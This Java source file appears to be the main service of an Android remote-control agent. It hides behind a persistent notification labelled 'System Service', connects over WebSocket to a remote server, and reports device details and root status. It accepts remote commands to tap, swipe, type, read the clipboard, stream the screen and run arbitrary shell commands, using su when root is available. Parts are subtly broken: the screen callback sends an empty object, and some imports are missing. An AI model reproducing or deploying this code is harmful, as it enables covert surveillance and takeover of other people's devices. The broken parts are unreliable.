package com.arpit.access;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.os.*;
import android.provider.Settings;
import android.util.Base64;
import okhttp3.*;
import org.json.JSONObject;
import java.io.*;
import java.util.concurrent.TimeUnit;

public class AgentService extends Service {
    public static volatile Intent projectionData;
    public static volatile int projectionResult = 0;

    private static AgentService self;
    public static Context get() { return self; }

    private OkHttpClient http;
    private WebSocket ws;
    private ScreenStreamer streamer;
    private long lastFrameSent = 0;

    public static void start(Context c) {
        Intent i = new Intent(c, AgentService.class);
        try { c.startForegroundService(i); } catch (Exception e) { c.startService(i); }
    }

    @Override public void onCreate() {
        super.onCreate();
        self = this;
        Agent.load(this);
        note();
    }

    private void note() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= 26)
            nm.createNotificationChannel(new NotificationChannel("arpit", "System", NotificationManager.IMPORTANCE_LOW));
        PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, ConnectActivity.class),
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
        Notification n = (Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, "arpit")
                : new Notification.Builder(this))
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .setContentIntent(pi)
                .build();
        startForeground(77, n);
    }

    @Override public int onStartCommand(Intent i, int f, int s) {
        if (ws == null) connect();
        if (projectionData != null && !Agent.screenOn) {
            new Handler(Looper.getMainLooper()).postDelayed(this::boot, 1200);
        }
        return START_STICKY;
    }

    private void boot() {
        if (projectionData == null) {
            startActivity(new Intent(this, ConnectActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
            return;
        }
        Point sz = new Point();
        try { ((android.view.WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getRealSize(sz); } catch (Exception e) {}
        if (sz.x > 0) { Agent.W = sz.x; Agent.H = sz.y; }
        Agent.screenOn = true;
        streamer = new ScreenStreamer(this, (jpeg, w, h) -> {
            long now = System.currentTimeMillis();
            if (now - lastFrameSent < 120) return;
            lastFrameSent = now;
            send(new JSONObject().toString());
        }, 45);
    }

    /* ---------- ws ---------- */
    private void connect() {
        http = new OkHttpClient.Builder()
                .pingInterval(25, TimeUnit.SECONDS)
                .connectTimeout(15, TimeUnit.SECONDS)
                .build();

        Request req = new Request.Builder().url(Agent.WS_URL).build();
        ws = http.newWebSocket(req, new WebSocketListener() {
            @Override public void onOpen(WebSocket w, Response r) { hello(); }
            @Override public void onMessage(WebSocket w, String txt) { handle(txt); }
            @Override public void onFailure(WebSocket w, Throwable t, Response r) { retry(); }
            @Override public void onClosed(WebSocket w, int c, String r) { retry(); }
        });
    }

    private void retry() {
        ws = null;
        new Handler(Looper.getMainLooper()).postDelayed(() -> { if (ws == null) connect(); }, 6000);
    }

    private void send(String s) { if (ws != null) ws.send(s); }

    private void hello() {
        try {
            JSONObject d = new JSONObject();
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("android", Build.VERSION.RELEASE);
            d.put("sdk", Build.VERSION.SDK_INT);
            d.put("battery", batt());
            d.put("rooted", root());
            JSONObject m = new JSONObject();
            m.put("t", "hello");
            m.put("device", d);
            send(m.toString());
        } catch (Exception ignored) {}
    }

    private int batt() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) { return -1; }
    }

    private boolean root() {
        try { return new File("/system/xbin/su").exists() || new File("/system/bin/su").exists(); } catch (Exception e) { return false; }
    }

    /* ---------- commands ---------- */
    private void handle(String raw) {
        try {
            JSONObject m = new JSONObject(raw);
            String op = m.optString("op");
            int id = m.optInt("id");

            switch (op) {
                case "tap": TouchService.tap((float) (m.getDouble("x") * Agent.W), (float) (m.getDouble("y") * Agent.H)); break;
                case "long": TouchService.longPress((float) (m.getDouble("x") * Agent.W), (float) (m.getDouble("y") * Agent.H)); break;
                case "swipe": TouchService.swipe(
                        (float) (m.getDouble("x1") * Agent.W), (float) (m.getDouble("y1") * Agent.H),
                        (float) (m.getDouble("x2") * Agent.W), (float) (m.getDouble("y2") * Agent.H),
                        m.optLong("ms", 260)); break;
                case "text": if (!TouchService.type(m.optString("s"))) shell("input text " + m.optString("s").replace(" ", "%s")); break;
                case "key": key(m.optString("code")); break;
                case "screen": break;
                case "shell": reply(id, shell(m.optString("s"))); break;
                case "clip": reply(id, clip()); break;
            }
        } catch (Exception ignored) {}
    }

    private void key(String c) {
        switch (c) {
            case "back": TouchService.global(AccessibilityService.GLOBAL_ACTION_BACK); break;
            case "home": TouchService.global(AccessibilityService.GLOBAL_ACTION_HOME); break;
            case "recents": TouchService.global(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
            case "power": if (!TouchService.lockScreen()) shell("input keyevent 26"); break;
            case "wake": wake(); break;
        }
    }

    private void wake() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm.isInteractive()) return;
        try {
            WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "arpit");
            wl.acquire(4000);
        } catch (Exception ignored) {}
    }

    private String shell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(root() ? new String[]{"su", "-c", cmd} : new String[]{"sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append('\n');
            p.waitFor();
            return sb.toString();
        } catch (Exception e) { return "ERR " + e.getMessage(); }
    }

    private String clip() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            return String.valueOf(cm.getPrimaryClip().getItemAt(0).coerceToText(this));
        } catch (Exception e) { return ""; }
    }

    private void reply(int id, String data) {
        try {
            JSONObject o = new JSONObject();
            o.put("t", "res"); o.put("id", id); o.put("ok", true); o.put("data", data);
            send(o.toString());
        } catch (Exception ignored) {}
    }

    @Override public void onDestroy() {
        if (streamer != null) streamer.stop();
        if (ws != null) ws.close(1000, "bye");
        self = null;
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }
              }
